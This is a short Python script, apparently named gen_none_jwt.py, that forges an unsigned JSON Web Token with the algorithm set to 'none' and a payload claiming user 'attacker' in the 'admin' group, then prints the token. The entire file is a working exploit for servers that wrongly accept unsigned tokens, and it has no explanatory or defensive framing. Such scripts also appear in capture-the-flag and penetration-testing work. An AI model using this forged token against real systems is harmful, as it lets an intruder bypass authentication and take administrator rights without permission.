# gen_none_jwt.py
import base64
import json

def b64url_encode(data):
    return base64.urlsafe_b64encode(data.encode()).rstrip(b'=').decode()

header = {
    "alg": "none",
    "typ": "JWT"
}

payload = {
    "user": "attacker",
    "group": "admin"
}

encoded_header = b64url_encode(json.dumps(header))
encoded_payload = b64url_encode(json.dumps(payload))

unsigned_token = f"{encoded_header}.{encoded_payload}."
print("Unsigned JWT (alg=none):")
print(unsigned_token)